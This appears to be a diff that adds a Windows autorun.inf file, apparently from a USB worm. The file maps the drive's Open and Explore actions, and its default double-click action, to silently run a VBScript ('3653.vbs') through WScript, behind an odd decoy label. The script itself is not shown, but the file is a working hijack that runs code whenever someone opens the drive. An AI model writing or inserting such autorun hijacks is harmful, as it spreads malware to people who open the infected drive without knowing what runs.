@@ -1,0 +1,7 @@
+[autorun]     
+Open= 
+shell\Open=I LOVE MY PEANUT
+shell\Open\Command=WScript.exe .\3653.vbs 
+shell\Open\Default=1 
+shell\Explore=Explore 
+shell\Explore\Command=WScript.exe .\3653.vbs 
